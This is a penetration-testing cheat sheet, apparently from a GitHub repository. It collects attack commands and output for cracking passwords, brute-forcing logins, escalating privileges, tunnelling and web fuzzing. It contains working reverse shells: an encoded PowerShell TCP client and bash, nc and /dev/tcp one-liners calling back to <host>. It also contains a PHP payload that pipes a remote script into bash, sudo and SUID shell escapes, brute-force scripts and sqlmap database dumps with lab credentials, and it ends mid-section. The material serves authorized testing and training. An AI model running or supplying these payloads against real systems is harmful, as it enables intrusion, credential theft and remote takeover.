# Cyber Cheat Sheet

<h1 align="center">
  <a href="https://github.com/kraloveckey/venom/penetration-testing"><img src="../images/img/hack-logo.png" width=150 height=140 lt="Cyber Cheat Sheet"></a>
</h1>

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/kraloveckey)

[![Telegram Channel](https://img.shields.io/badge/Telegram%20Channel-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/cyber_notes)

[`HackTricks`](https://book.hacktricks.xyz/) - the wiki where you will find each hacking trick/technique/whatever I have learnt from CTFs, real life apps, reading researches, and news.

---

## Overview
- [Cyber Cheat Sheet](#cyber-cheat-sheet)
  - [Overview](#overview)
  - [Base64](#base64)
  - [Crack password](#crack-password)
    - [hashcat](#hashcat)
    - [hydra](#hydra)
    - [john](#john)
  - [Databases](#databases)
    - [PostgreSQL](#postgresql)
    - [sqlite](#sqlite)
  - [DNS](#dns)
  - [Email](#email)
  - [Git](#git)
  - [Joomla](#joomla)
  - [NFS](#nfs)
  - [Privilege escalation](#privilege-escalation)
    - [Search non-secure files](#search-non-secure-files)
    - [Privilege escalation vectors](#privilege-escalation-vectors)
    - [Unsafe bash](#unsafe-bash)
  - [Proxy](#proxy)
    - [chisel](#chisel)
  - [Reverse shell](#reverse-shell)
    - [Payload generation](#payload-generation)
  - [Samba](#samba)
  - [Scanning ports](#scanning-ports)
  - [Search in files](#search-in-files)
  - [Search exploits](#search-exploits)
  - [Simple web-servers](#simple-web-servers)
  - [SNMP](#snmp)
  - [sqlmap](#sqlmap)
  - [SSH](#ssh)
  - [Web-scan](#web-scan)
    - [dirsearch](#dirsearch)
    - [ffuf](#ffuf)
    - [gobuster](#gobuster)
    - [wfuzz](#wfuzz)
  - [Wi-Fi](#wi-fi)
  - [Windows](#windows)
    - [ASPX](#aspx)
    - [ASREPRoast](#asreproast)
    - [bloodyAD](#bloodyad)
      - [Read GMSA password](#read-gmsa-password)
    - [Bloodhound](#bloodhound)
    - [Bypass Constrained Delegation restrictions with RBCD](#bypass-constrained-delegation-restrictions-with-rbcd)
    - [certipy](#certipy)
    - [certutil](#certutil)
    - [CrackMapExec](#crackmapexec)
    - [DCSync](#dcsync)
    - [dcom-exec](#dcom-exec)
    - [Decode password](#decode-password)
    - [Evil-WinRM](#evil-winrm)
    - [kerbrute](#kerbrute)
    - [mimikatz](#mimikatz)
    - [MSSQL](#mssql)
    - [ntpdate](#ntpdate)
    - [powerview](#powerview)
    - [psexec](#psexec)
    - [Rubeus](#rubeus)
    - [RunasCs](#runascs)
    - [smbexec](#smbexec)
    - [wmiexec.py](#wmiexecpy)
  - [XSS](#xss)

---

## Base64

**[`^        back to top        ^`](#overview)**

Base64 Encode/Decode:

```shell
echo "TEST" | base64
VEVTVAo=

echo "VEVTVAo=" | base64 --decode
TEST
```

Powershell ToBase64String & Linux base64:

```shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("<host>",4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -f UTF8 -t UTF16LE | base64

JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBO
AGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAPABoAG8AcwB0AD4A
IgAsADQANAA0ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0
AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4A
LgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBl
AGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUA
bgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBP
AGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4A
QQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0
AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQA
ZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBu
AGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsA
IAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAg
AD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcA
ZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBX
AHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwA
ZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBl
AG4AdAAuAEMAbABvAHMAZQAoACkA
```

```shell
echo "JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAPABoAG8AcwB0AD4AIgAsADQANAA0ADUAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA" | base64 --decode

$client = New-Object System.Net.Sockets.TCPClient("<host>",4445);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Crack password

**[`^        back to top        ^`](#overview)**

### hashcat

Hash identify:

```shell
hashcat --identify hash.txt
```

```shell
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

Example output:

```text
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```

hashcat in mask mode, e.x. password like this template - `{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}`:

```shell
nano hash.txt
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f

hashcat -m 1400 hash.txt -a 3 susan_nasus_?d?d?d?d?d?d?d?d?d
```

hashcat with kerbrute:

```shell
./kerbrute userenum --dc <host> -d spookysec.local userlist.txt -t 100
GetNPUsers.py spookysec.local/svc-admin -request -no-pass -dc-ip <host>

hashcat --force -m 18200 -a 0 svc-admin.hash /usr/share/wordlists/rockyou.txt 
```

### hydra

```shell
hydra -l <username> -P <password list> <host> http-post-form "/<login url>:username=^USER^&password=^PASS^:F=incorrect" -V -F -u

hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV <host> ftp
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV <host> ssh
hydra -l milesdyson -P /usr/share/wordlists/rockyou.txt -vV <host> smb
hydra -t 16 -L users.txt -p PASSWORD -vV <host> ssh
```

### john

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=raw-sha256
```

## Databases

**[`^        back to top        ^`](#overview)**

### PostgreSQL

```shell
psql "postgresql://$DB_USER:$DB_PWD@$DB_SERVER/$DB_NAME"

psql -U postgres -W -h localhost -d cozyhosting
psql "postgresql://postgres:nvzAQ7XxR@localhost:5432/cozyhosting"

psql -U postgres -W -h localhost -d cozyhosting
Password: Vg&nvzAQ7XxR

\list
                                   List of databases
    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges
-------------+----------+----------+-------------+-------------+-----------------------
 cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
 template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
 template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
             |          |          |             |             | postgres=CTc/postgres
(4 rows)

\c cozyhosting
Password: Vg&nvzAQ7XxR

You are now connected to database "cozyhosting" as user "postgres".
\d
              List of relations
 Schema |     Name     |   Type   |  Owner
--------+--------------+----------+----------
 public | hosts        | table    | postgres
 public | hosts_id_seq | sequence | postgres
 public | users        | table    | postgres
(3 rows)

SELECT * FROM users;
   name    |                           password                           | role
-----------+--------------------------------------------------------------+-------
 kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
 admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
(2 rows)
```

### sqlite

Connect to `.sqlite` database and dump data:

```shell
sqlite3 1.sqlite

sqlite> .dump
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE users (username TEXT PRIMARY KEY NOT NULL, password TEXT NOT NULL);
INSERT INTO users VALUES('emily','abigchonkyboi123');
CREATE TABLE images (url TEXT PRIMARY KEY NOT NULL, original TEXT NOT NULL, username TEXT NOT NULL);
COMMIT;
```

Get tables and select from it:

```shell
sqlite> .tables
sqlite> select * from accounts_customuser;
```

## DNS

**[`^        back to top        ^`](#overview)**

Check what domains the DNS server gives:

```shell
dig any DOMAIN @IP_OR_DOMAIN
```

## Email

**[`^        back to top        ^`](#overview)**

Send email with [swaks](https://github.com/jetmore/swaks):

```shell
swaks -f ${MAIL_FROM} -t ${MAIL_TO} -s ${MAIL_SMTP} --auth-user=${MAIL_AUTH} --auth-password=${MAIL_PASS} -tlsc -p ${MAIL_PORT} --body ${EMAIL} --header "Subject: Bruteforce Report" --add-header "Content-Type: text/plain; charset=UTF-8" --h-From: '"Cloud Storage" <'${MAIL_FROM}'>'
```

Send fast test email with [swaks](https://github.com/jetmore/swaks):

```shell
swaks -f ${MAIL_FROM} -t ${MAIL_TO} -s ${MAIL_SMTP} -auth-user=${MAIL_AUTH}  --auth-password=${MAIL_PASS} -tlsc -p ${MAIL_PORT} --body "TEST" --header "Subject: Mail Test"
```

## Git

**[`^        back to top        ^`](#overview)**

Create simple .net project:

```shell
wget https://dot.net/v1/dotnet-install.sh -O dotnet-install.sh
chmod +x ./dotnet-install.sh
./dotnet-install.sh --version latest
./dotnet-install.sh --channel 6.0
ln -s /root/.dotnet/dotnet /usr/local/bin/

mkdir project && cd project
mkdir visual
dotnet new console -n visual -f net6.0
dotnet new sln -n visual
dotnet sln visual.sln add visual/visual.csproj

git init
git add .
git commit -m "update"

git config user.email "visual@example.com"
git config user.name "visual"

git update-server-info
ls -la

total 4
drwxr-xr-x 1 root root  40 гру  8 15:29 .
drwxr-xr-x 1 root root 544 гру  8 15:29 ..
drwxr-xr-x 1 root root 144 гру  8 15:30 .git
drwxr-xr-x 1 root root  52 гру  8 15:28 visual
-rw-r--r-- 1 root root 994 гру  8 15:28 visual.sln
```

Use [git-dumper](https://github.com/arthaud/git-dumper) to download files:

```shell
git-dumper <URL> <output directory>
```

## Joomla

**[`^        back to top        ^`](#overview)**

```shell
joomscan --url http://<host>
```

## NFS

**[`^        back to top        ^`](#overview)**

Check which directories are exported via NFS.

```shell
sudo apt-get install nfs-common
/sbin/showmount --exports <host>
```

Mount to the local folder:

```shell
mount -t nfs <host>:/mnt/backups /mnt/
```

## Privilege escalation

**[`^        back to top        ^`](#overview)**

Check `sudo` privileges:

```shell
sudo -l
```

### Search non-secure files

Finding SUID executables (dind files with permission to execute files they normally would not be allowed to):

```shell
find / -perm -4000 2>/dev/null

find / -perm -u=s -type f 2>/dev/null
```

### Privilege escalation vectors

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

  - LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
  - LinEnum: https://github.com/rebootuser/LinEnum
  - LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
  - Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
  - Linux Priv Checker: https://github.com/linted/linuxprivchecker 
  - WinPEAS can be downloaded https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS.
  - PrivescCheck can be downloaded https://github.com/itm4n/PrivescCheck.
  - WES-NG is a Python script that can be found and downloaded https://github.com/bitsadmin/wesng.

Use `linpeas.sh`:

```shell
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
bash linpeas.sh
```

Change `/bin/bash` permissions:

```shell
chmod u+s /bin/bash
/bin/bash -p
```

---

Use [gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo) method.

```shell
josh@cozyhosting:~$ sudo -l
[sudo] password for josh:
Matching Defaults entries for josh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *

sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```

---

exim - 'perl_startup' Local Privilege Escalation (Metasploit): https://www.exploit-db.com/exploits/39702 or https://0xn3va.gitbook.io/cheat-sheets/web-application/command-injection#perllib-and-perl5lib.

Example:

```shell
PERL5OPT=-d PERL5DB='exec "#{c}"' exim -ps 2>&-
sudo PERL5OPT=-d PERL5DB='exec "ls /root"' /opt/monitor.sh

jack@clicker:~$ sudo PERL5OPT=-d PERL5DB='exec "ls /root"' /opt/monitor.sh
Statement unlikely to be reached at /usr/bin/xml_pp line 9.
        (Maybe you meant system() when you said exec()?)
diagnostic_files  restore  root.txt
```
---

### Unsafe bash

If we found something unsafe in the MYSQL bash script, [the unquoted variable comparison](https://github.com/anordal/shellharden/blob/master/how_to_do_things_safely_in_bash.md?source=post_page-----933488bfbfff--------------------------------).

```bash
Variable expansion:

    Good: "$my_var"
    Bad: $my_var

Command substitution:

    Good: "$(cmd)"
    Bad: $(cmd)

```

It seems he can sudo run a backup script located at ```/opt/scripts/mysql-backup.sh```. Inspect the code of the script which reveals to be vulnerable to wildcard injection.

```bash
...
if [[ $DB_PASS == $USER_PASS ]]; then
...
```

Okay, but how to exploit it, after searching online I have [found out](https://mywiki.wooledge.org/BashPitfalls?source=post_page-----933488bfbfff--------------------------------) that if right side of `==` is not quoted then bash does pattern matching against it, instead of treating it as a string.

```bash
{valid_password_char}{*}
```

Using double brackets in the if comparison allows us to use wildcards to guess the password, using a process similar to blind sql injections. To find out more about the difference between single brackets and double brackets read this: https://www.baeldung.com/linux/bash-single-vs-double-brackets#4-pattern-matching. In summary, both conditions ```[[$DB_PASS == Password123!]] and [[$DB_PASS == P* ]]``` will be evaluated as true in the if statement. To brute force the password you can use 3 methods:

- **Manually**. Letter by letter, **not recommended**.
- **Semi-manually**. Create a file called letter containing all lower-case, upper-case and digits and bruteforce them using a loop. As soon as you find a new character, add it to the for loop (e.g. ...echo abcde*...) and repeat until no more letters are discovered. Add letters sequentially as you discover in each iteration. The first loop iteration would look like this:

    ```bash
    for i in $(cat letters);do echo a* | sudo /opt/scripts/mysql-backup.sh && echo "$i";done
    ```

- **Using a python script**. Elegant and fast. The machine also has perl installed. A proposed python script would be the following:

```python
import string
import os

chars = string.ascii_letters + string.digits
password=''
next=1

print("[+] Initializing bruteforce script...")
print("[+] Bruteforce in progress, please wait...")
while next==1:
        for i in chars:
                errorlevel=os.system("echo "+password+i+"* | sudo /opt/scripts/mysql-backup.sh >/dev/null 2>&1")
                if errorlevel==0:
                        password=password+i
                        print("[+] new character found: "+password)
                        next=1
                        break
                else: next=0
print("[+] Process terminated, root password is: "+password)
```

Or

We can guess or brute force the first password character followed by * to bypass the password prompt. And we can also brute force every character of the password till we found all characters of the password. Here is the python script, I used to brute force and extract the password.

```python
import string
import subprocess
all = list(string.ascii_letters + string.digits)
password = ""
found = False

while not found:
    for character in all:
        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        if "Password confirmed!" in output:
            password += character
            print(password)
            break
    else:
        found = True
```

Running it, the root mysql password is revealed in less than a minute, which turns out to be a reuse of the system's root password.

```bash
joshua@codify:~$ nano 1.py
joshua@codify:~$ python3 1.py
k
kl
klj
kljh
kljh1
kljh12
kljh12k
kljh12k3
kljh12k3j
kljh12k3jh
kljh12k3jha
kljh12k3jhas
kljh12k3jhask
kljh12k3jhaskj
kljh12k3jhaskjh
kljh12k3jhaskjh1
kljh12k3jhaskjh12
kljh12k3jhaskjh12k
kljh12k3jhaskjh12kj
kljh12k3jhaskjh12kjh
kljh12k3jhaskjh12kjh3
```

## Proxy

**[`^        back to top        ^`](#overview)**

Proxy port from remote machine to local via `Meterpreter` session:

```shell
(Meterpreter 2)(C:\Windows\system32) > portfwd add -l 9200 -p 9200 -r 127.0.0.1
[*] Forward TCP relay created: (local) :9200 -> (remote) 127.0.0.1:9200
```

### chisel

For example, there is port 8083. Proxy it to see what it does. Choose chisel, which has a more stable speed.

```shell
$ wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz
$ gzip -d chisel_1.9.1_windows_amd64.gz
$ mv chisel_1.9.1_windows_amd64 chisel.exe
$ chisel server --port 1133 --reverse
2024/02/21 13:24:22 server: Reverse tunnelling enabled
2024/02/21 13:24:22 server: Fingerprint c/HoJKuWS5e8QfRNRVjGpXQE5Nw5gSXLEFbzFried5M=
2024/02/21 13:24:22 server: Listening on http://0.0.0.0:1133


meterpreter > upload chisel.exe
meterpreter > shell
Process 5604 created.
Channel 3 created.
Microsoft Windows [Version 10.0.20348.2322]
(c) Microsoft Corporation. All rights reserved.

C:\Users\tstark>.\chisel.exe client REMOTE_IP:1133 R:8083:127.0.0.1:8083
.\chisel.exe client REMOTE_IP:1133 R:8083:127.0.0.1:8083
2024/02/21 09:08:16 client: Connecting to ws://REMOTE_IP:1133
2024/02/21 09:08:18 client: Connected (Latency 156.9429ms)
```

For Linux:

```shell
./chisel client REMOTE_IP:1133 R:8083:127.0.0.1:8083
```

The proxy came out successfully, then open it and take a look: `http://127.0.0.1:8083/`.

## Reverse shell

**[`^        back to top        ^`](#overview)**

Use [`Reverse Shell Generator`](https://www.revshells.com/) or options below.

```shell
bash -c "bash -i >& /dev/tcp/<host>/4444 0<&1"
```

```shell
/bin/bash -c 'exec bash -i &>/dev/tcp/<host>/4444 <&1'
```

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <host> 4444 >/tmp/f
```

Open the listener for catch a shell:

```shell
rlwrap nc -nlvp 4444

or

nc -nlvp 4444
```

### Payload generation

Create Linux payload:

```shell
echo "bash -c 'bash -i >& /dev/tcp/<host>/4444 0<&1'" | base64
echo "bash -c 'bash -i >& /dev/tcp/<host>/4444 0>&1'" > shell.sh
```

Create powershell payload:

```shell
echo -n '$client = New-Object System.Net.Sockets.TCPClient("REMOTE_IP",REMOTE_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' | iconv -f UTF8 -t UTF16LE | base64
```

Execute it:

```shell
?cmd=powershell -e payload
```

Create PHP payload:

```php
@php
system("curl http://<host>:8081/rev.sh|bash");
@endphp
```

Or use [`MSFVenom Payloads`](msfvenom-payloads.md).

## Samba

**[`^        back to top        ^`](#overview)**

Connect as anonymous:

```shell
smbclient //<host>/anonymous
```

Get shares that access for user:

```shell
smbmap -H <host> -u "USERNAME" -p "PASSWORD"
```

Connect as user:

```shell
smbclient //<host>/SHARE_NAME -U USERNAME
Password for [WORKGROUP\USERNAME]:
```

Download from samba folder:

```shell
smbget -R smb://<host>/anonymous
```

## Scanning ports

**[`^        back to top        ^`](#overview)**

Scan all TCP and UDP ports from interface tun0 at 1000 packets per second.

```shell
masscan -e tun0 -p1-65535,U:1-65535 <host> --rate=1000
```

Install rustscan:

```shell
wget https://github.com/RustScan/RustScan/files/9473239/rustscan_2.1.0_both.zip
unzip rustscan_2.1.0_both.zip
dpkg -i rustscan_2.1.0_amd64.deb

or 

cargo install rustscan
Add to .bashrc or .zshrc: . "$HOME/.cargo/env"
```

Fast scan all ports with rustscan:

```shell
rustscan --ulimit=5000 --range=1-65535 -a <host> -- -A -sC
```

Slow scan all ports with nmap:

```shell
nmap --privileged -sV -sC -sS -p- -oN nmap <host>
```

To get more information about the services that are running on the ports, let's run an nmap scan with the -A option.

```shell
nmap -A -sV -sC <host> -p80,135,139,445
```

## Search in files

**[`^        back to top        ^`](#overview)**

Search in the files of directory `/etc` the string `pass`:

```shell
grep -i -r "pass" ./etc/
grep -Frlw "pass" ./etc/
```

## Search exploits

**[`^        back to top        ^`](#overview)**

```shell
apt install docker.io
docker run -d -p 443:443 --name openvas mikesplain/openvas
```

This command will both pull the docker container and then run the container. It may take a few minutes for the container to fully set up and begin running. Once it is complete you can then navigate to ```https://127.0.0.1``` in your preferred browser and OpenVAS will be setup and ready to go!

Below are the default credentials to access OpenVAS/GVM:

```shell
Username: admin
Password: admin
```

Search exploit for service:

```shell
searchsploit squirrelmail 1.4
```

## Simple web-servers

**[`^        back to top        ^`](#overview)**

Python web-server:

```shell
python3 -m http.server 8081
```

PHP web-server:

```shell
php -S 0.0.0.0:8081
```

## SNMP

**[`^        back to top        ^`](#overview)**

```shell
snmpwalk -v2c -c public <host>
```

## sqlmap

**[`^        back to top        ^`](#overview)**

```shell
sqlmap -u "http://<host>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Check SQL Injection in nagions:

```shell
sqlmap -u "https://<host>//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=1ec86e6d63a7db533923217f3db57a35a244e800" --level 5 --risk 3 -p id

Pull nagios the database:

```shell
sqlmap -u "https://<host>//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&id=3&token=`curl -ksX POST https://<host>/nagiosxi/api/v1/authenticate -d "username=svc&password=XjH7VCehowpR1xZB&valid_min=500" | awk -F'"' '{print$12}'`" --level 5 --risk 3 -p id --batch -D nagiosxi --dump
```

## SSH

**[`^        back to top        ^`](#overview)**

Connect via ssh:

```shell
ssh -o StrictHostKeyChecking=no -T root@<host>
```

Proxy 8080 port from remote machine `<host>` to `localhost`:

```shell
ssh -L 8080:127.0.0.1:8080 username@<host>
```

Create private and public keys with name `test`:

```shell
ssh-keygen -t rsa -b 4096 -f test
```

## Web-scan

**[`^        back to top        ^`](#overview)**

### dirsearch

Let's search the directories with dirsearch.

```shell
dirsearch -u http://<host>:port/ --exclude-status 403,404,400,401 -o dir
```

### ffuf

Directory fuzzing:

```shell
ffuf -u http://<host>/FUZZ -w /usr/share/dirb/wordlists/common.txt -mc 200,204,301,302,307

ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u "http://<host>/FUZZ" -c
```

Subdomain search with ffuf:

```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u "<host>" -H "HOST: FUZZ.<host>" -c -fs 169
```

### gobuster

Let's search the directories with gobuster. In the parameters we specify the number of threads 128 (-t), URL (-u), dictionary (-w) and extensions we are interested in (-x).

```shell
gobuster dir -t 128 -k -u <host> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sh,cgi
gobuster dir -t 50 -k -u http://<host>:49663 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,301' --no-error
```

Let's search the subdomains with gobuster:

```shell
gobuster vhost -u <host> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -k

gobuster vhost -u <host> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 20
```

If we see DNS server in the ports, so let's try to crawl domains:

```shell
gobuster dns -d <host> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r <host>:53
```

### wfuzz

Wfuzz has been created to facilitate the task in web applications assessments and it is based on a simple concept: it replaces any reference to the FUZZ keyword by the value of a given payload.

```shell
pip install wfuzz
```

Let's search the subdomains with wfuzz:

```shell
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "<host>" -H "Host: FUZZ.<host>" --hl 7

wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hc 400,404,403 -H "Host: FUZZ.<host>" -u http://<host> -t 100

wfuzz -H "Host: FUZZ.<host>" --hw 11 -c -z file,"/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt" http://<host>/
```

Let's search the directories and files with wfuzz:

```shell
wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --sc 200,202,204,301,302,307,403 http://<host>/FUZZ
```

Login Form bruteforce. POST, Single list, filter string (hide):

```shell
wfuzz -c -w users.txt --hs "Login name" -d "name=FUZZ&password=FUZZ&autologin=1&enter=Sign+in" http://<host>/zabbix/index.php
#Here we have filtered by line
```

Login Form bruteforce. POST, 2 lists, filter code (show):

```shell
wfuzz.py -c -z file,users.txt -z file,pass.txt --sc 200 -d "name=FUZZ&password=FUZ2Z&autologin=1&enter=Sign+in" http://<host>/zabbix/index.php
#Here we have filtered by code
```

Login Form bruteforce. GET, 2 lists, filter string (show), proxy, cookies:

```shell
wfuzz -c -w users.txt -w pass.txt --ss "Welcome " -p 127.0.0.1:8080:HTTP -b "PHPSESSIONID=1234567890abcdef;customcookie=hey" "http://example.com/index.php?username=FUZZ&password=FUZ2Z&action=sign+in"
```

Cookie/Header bruteforce (vhost brute). Cookie, filter code (show), proxy:

```shell
